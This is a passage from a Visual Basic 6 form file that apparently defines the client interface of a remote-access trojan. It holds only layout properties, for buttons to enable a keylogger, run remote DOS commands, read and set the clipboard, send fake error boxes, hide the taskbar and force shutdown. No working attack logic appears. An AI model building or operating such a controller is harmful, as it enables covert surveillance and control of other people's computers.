         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   60
      TabIndex        =   2
      Text            =   "127.0.0.1"
      Top             =   60
      Width           =   3495
   End
   Begin VB.ListBox lstMenu 
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3540
      Left            =   60
      TabIndex        =   1
      Top             =   360
      Width           =   1995
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   10
      Left            =   2580
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   4000
      TabIndex        =   71
      Top             =   840
      Visible         =   0   'False
      Width           =   4005
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Reboot"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   21
         Left            =   2940
         TabIndex        =   73
         Top             =   3480
         Width           =   975
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Get Clipboard Text"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   26
         Left            =   1980
         TabIndex        =   75
         Top             =   2580
         Width           =   1935
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Set Clipboard Text"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   25
         Left            =   60
         TabIndex        =   77
         Top             =   2580
         Width           =   1935
      End
      Begin VB.TextBox txtClipboard 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2475
         Left            =   60
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   76
         Top             =   60
         Width           =   3855
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Shutdown"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   22
         Left            =   2940
         TabIndex        =   74
         Top             =   3195
         Width           =   975
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Logoff"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   23
         Left            =   2940
         TabIndex        =   72
         Top             =   2910
         Width           =   975
      End
      Begin VB.Frame Frame1 
         Appearance      =   0  'Flat
         ForeColor       =   &H80000008&
         Height          =   915
         Left            =   60
         TabIndex        =   78
         Top             =   2820
         Width           =   2835
         Begin VB.CommandButton cmdCommand 
            Caption         =   "Get Time && Date"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Index           =   28
            Left            =   1440
            TabIndex        =   82
            Top             =   525
            Width           =   1275
         End
         Begin VB.CommandButton cmdCommand 
            Caption         =   "Set Time && Date"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Index           =   27
            Left            =   120
            TabIndex        =   81
            Top             =   525
            Width           =   1275
         End
         Begin VB.TextBox txtDate 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   1920
            TabIndex        =   80
            Top             =   240
            Width           =   795
         End
         Begin VB.TextBox txtTime 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   540
            TabIndex        =   79
            Top             =   240
            Width           =   915
         End
         Begin VB.Label lblDate 
            Caption         =   "Date:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   1515
            TabIndex        =   84
            Top             =   240
            Width           =   375
         End
         Begin VB.Label lblTimeS 
            Caption         =   "Time:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   83
            Top             =   240
            Width           =   375
         End
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   9
      Left            =   2520
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   3984.906
      TabIndex        =   55
      Top             =   780
      Visible         =   0   'False
      Width           =   3990
      Begin VB.CheckBox chkErrorButton 
         Appearance      =   0  'Flat
         Caption         =   "Yes, No"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   4
         Left            =   2280
         TabIndex        =   70
         Top             =   1140
         Width           =   975
      End
      Begin VB.CheckBox chkErrorButton 
         Appearance      =   0  'Flat
         Caption         =   "Yes, No, Cancel"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   3
         Left            =   2280
         TabIndex        =   69
         Top             =   900
         Width           =   1635
      End
      Begin VB.CheckBox chkErrorButton 
         Appearance      =   0  'Flat
         Caption         =   "Retry, Cancel"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   5
         Left            =   2280
         TabIndex        =   68
         Top             =   1380
         Width           =   1395
      End
      Begin VB.CheckBox chkErrorButton 
         Appearance      =   0  'Flat
         Caption         =   "Abort, Retry, Ignore"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   2
         Left            =   180
         TabIndex        =   67
         Top             =   1380
         Width           =   1995
      End
      Begin VB.CheckBox chkErrorButton 
         Appearance      =   0  'Flat
         Caption         =   "OK, Cancel"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   180
         TabIndex        =   66
         Top             =   1140
         Width           =   1275
      End
      Begin VB.CheckBox chkErrorButton 
         Appearance      =   0  'Flat
         Caption         =   "OK"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   180
         TabIndex        =   65
         Top             =   900
         Value           =   1  'Checked
         Width           =   555
      End
      Begin VB.OptionButton optErrorIcon 
         Caption         =   "EMPTY"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   615
         Index           =   0
         Left            =   180
         Style           =   1  'Graphical
         TabIndex        =   64
         Top             =   120
         Width           =   675
      End
      Begin VB.OptionButton optErrorIcon 
         Height          =   615
         Index           =   64
         Left            =   3060
         Picture         =   "frmClient.frx":0CCE
         Style           =   1  'Graphical
         TabIndex        =   63
         Top             =   120
         Width           =   675
      End
      Begin VB.OptionButton optErrorIcon 
         Height          =   615
         Index           =   48
         Left            =   2340
         Picture         =   "frmClient.frx":0FD8
         Style           =   1  'Graphical
         TabIndex        =   62
         Top             =   120
         Width           =   675
      End
      Begin VB.OptionButton optErrorIcon 
         Height          =   615
         Index           =   32
         Left            =   1620
         Picture         =   "frmClient.frx":12E2
         Style           =   1  'Graphical
         TabIndex        =   61
         Top             =   120
         Width           =   675
      End
      Begin VB.OptionButton optErrorIcon 
         Height          =   615
         Index           =   16
         Left            =   900
         Picture         =   "frmClient.frx":15EC
         Style           =   1  'Graphical
         TabIndex        =   60
         Top             =   120
         Value           =   -1  'True
         Width           =   675
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Send Message"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   2
         Left            =   1980
         TabIndex        =   56
         Top             =   3360
         Width           =   1875
      End
      Begin VB.TextBox txtTitle 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   59
         Text            =   "Error"
         Top             =   1740
         Width           =   3735
      End
      Begin VB.TextBox txtMessage 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1185
         Left            =   120
         MultiLine       =   -1  'True
         TabIndex        =   58
         Text            =   "frmClient.frx":18F6
         Top             =   2100
         Width           =   3735
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "View Message"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   1
         Left            =   120
         TabIndex        =   57
         Top             =   3360
         Width           =   1875
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   7
      Left            =   2460
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   3984.906
      TabIndex        =   44
      Top             =   720
      Visible         =   0   'False
      Width           =   3990
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Activate Screen Saver"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   49
         Left            =   180
         TabIndex        =   103
         Top             =   600
         Width           =   3615
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Hide Start Button"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Index           =   6
         Left            =   2040
         TabIndex        =   49
         Top             =   2700
         Width           =   1755
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Hide Taskbar"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Index           =   4
         Left            =   2040
         TabIndex        =   51
         Top             =   1080
         Width           =   1755
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Hide Clock"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Index           =   16
         Left            =   2040
         TabIndex        =   45
         Top             =   1620
         Width           =   1755
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Hide Desktop"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Index           =   8
         Left            =   2040
         TabIndex        =   47
         Top             =   2160
         Width           =   1755
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Show Taskbar"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Index           =   3
         Left            =   180
         TabIndex        =   52
         Top             =   1080
         Width           =   1755
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Show Start Button"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Index           =   5
         Left            =   180
         TabIndex        =   50
         Top             =   2700
         Width           =   1755
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Show Desktop"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Index           =   7
         Left            =   180
         TabIndex        =   48
         Top             =   2160
         Width           =   1755
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Show Clock"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Index           =   15
         Left            =   180
         TabIndex        =   46
         Top             =   1620
         Width           =   1755
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   6
      Left            =   2400
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   3984.906
      TabIndex        =   40
      Top             =   660
      Visible         =   0   'False
      Width           =   3990
      Begin VB.TextBox txtDosCommand 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   60
         TabIndex        =   43
         Text            =   "netstat -a"
         Top             =   60
         Width           =   2475
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Dos Command"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   24
         Left            =   2580
         TabIndex        =   42
         Top             =   60
         Width           =   1335
      End
      Begin VB.TextBox txtDosOutput 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3375
         Left            =   60
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   41
         Top             =   360
         Width           =   3840
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   5
      Left            =   2340
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   3984.906
      TabIndex        =   17
      Top             =   600
      Visible         =   0   'False
      Width           =   3990
      Begin VB.CommandButton cmdWinColor 
         Caption         =   "Reset Default Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   5
         Left            =   1980
         TabIndex        =   23
         Top             =   2880
         Width           =   1575
      End
      Begin VB.CommandButton cmdWinColor 
         Caption         =   "Load Client Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   4
         Left            =   420
         TabIndex        =   24
         Top             =   2880
         Width           =   1575
      End
      Begin VB.CommandButton cmdWinColor 
         Caption         =   "Restore Client Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   3
         Left            =   1980
         TabIndex        =   25
         Top             =   3420
         Width           =   1575
      End
      Begin VB.CommandButton cmdWinColor 
         Caption         =   "Restore Server Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   2
         Left            =   1980
         TabIndex        =   26
         Top             =   3180
         Width           =   1575
      End
      Begin VB.CommandButton cmdWinColor 
         Caption         =   "Test Windows Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   1
         Left            =   420
         TabIndex        =   27
         Top             =   3420
         Width           =   1575
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H000000FF&
         ForeColor       =   &H80000008&
         Height          =   375
         Index           =   4
         Left            =   840
         ScaleHeight     =   345
         ScaleWidth      =   345
         TabIndex        =   33
         Top             =   2220
         Width           =   375
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H0000FFFF&
         ForeColor       =   &H80000008&
         Height          =   375
         Index           =   3
         Left            =   840
         ScaleHeight     =   345
         ScaleWidth      =   345
         TabIndex        =   32
         Top             =   1740
         Width           =   375
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         ForeColor       =   &H80000008&
         Height          =   375
         Index           =   2
         Left            =   840
         ScaleHeight     =   345
         ScaleWidth      =   345
         TabIndex        =   31
         Top             =   1260
         Width           =   375
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H00FF0000&
         ForeColor       =   &H80000008&
         Height          =   375
         Index           =   1
         Left            =   840
         ScaleHeight     =   345
         ScaleWidth      =   345
         TabIndex        =   30
         Top             =   780
         Width           =   375
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H0000FF00&
         ForeColor       =   &H80000008&
         Height          =   375
         Index           =   0
         Left            =   840
         ScaleHeight     =   345
         ScaleWidth      =   345
         TabIndex        =   29
         Top             =   300
         Width           =   375
      End
      Begin VB.CommandButton cmdWinColor 
         Caption         =   "Set Windows Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   0
         Left            =   420
         TabIndex        =   28
         Top             =   3180
         Width           =   1575
      End
      Begin MSComDlg.CommonDialog cdColor 
         Left            =   3360
         Top             =   60
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin VB.Label Label1 
         Caption         =   "Window Background"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   5
         Left            =   1380
         TabIndex        =   38
         Top             =   2280
         Width           =   1815
      End
      Begin VB.Label Label1 
         Caption         =   "Desktop Background"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   4
         Left            =   1380
         TabIndex        =   37
         Top             =   1800
         Width           =   1815
      End
      Begin VB.Label Label1 
         Caption         =   "Menu Background"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   3
         Left            =   1380
         TabIndex        =   36
         Top             =   1320
         Width           =   1575
      End
      Begin VB.Label Label1 
         Caption         =   "Taskbar && Buttons"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   2
         Left            =   1380
         TabIndex        =   35
         Top             =   840
         Width           =   1635
      End
      Begin VB.Label Label1 
         Caption         =   "Window Text"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   0
         Left            =   1320
         TabIndex        =   34
         Top             =   360
         Width           =   1215
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   3
      Left            =   2280
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   3984.906
      TabIndex        =   16
      Top             =   540
      Visible         =   0   'False
      Width           =   3990
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Clear Text Box"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   33
         Left            =   2820
         Style           =   1  'Graphical
         TabIndex        =   120
         Top             =   3480
         Width           =   1080
      End
      Begin VB.TextBox txtKeyLog 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   3375
         Left            =   60
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   22
         Top             =   60
         Width           =   3840
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Disable Keylogger"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   30
         Left            =   1440
         TabIndex        =   20
         Top             =   3480
         Width           =   1395
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Enable Keylogger"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   29
         Left            =   60
         TabIndex        =   21
         Top             =   3480
         Width           =   1395
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   2
      Left            =   2220
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   3984.906
      TabIndex        =   15
      Top             =   480
      Visible         =   0   'False
      Width           =   3990
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Get System Information"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   47
         Left            =   60
         TabIndex        =   19
         Top             =   3480
         Width           =   3855
      End
      Begin VB.TextBox txtSysInfo 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3375
         Left            =   60
         MultiLine       =   -1  'True
         TabIndex        =   18
         Top             =   60
         Width           =   3840
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   1
      Left            =   2160
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   4000
      TabIndex        =   7
      Top             =   420
      Visible         =   0   'False
      Width           =   4005
      Begin VB.CheckBox chkSubFolders 
         Caption         =   "Search Sub Folders"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   2340
         TabIndex        =   104
         Top             =   328
         Width           =   1515
      End
      Begin MSComctlLib.ImageList ImgList 
         Left            =   3300
         Top             =   3120
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   34
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":1917
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":1A71
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":1BCB
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":2165
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":26FF
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmClient.frx":2859
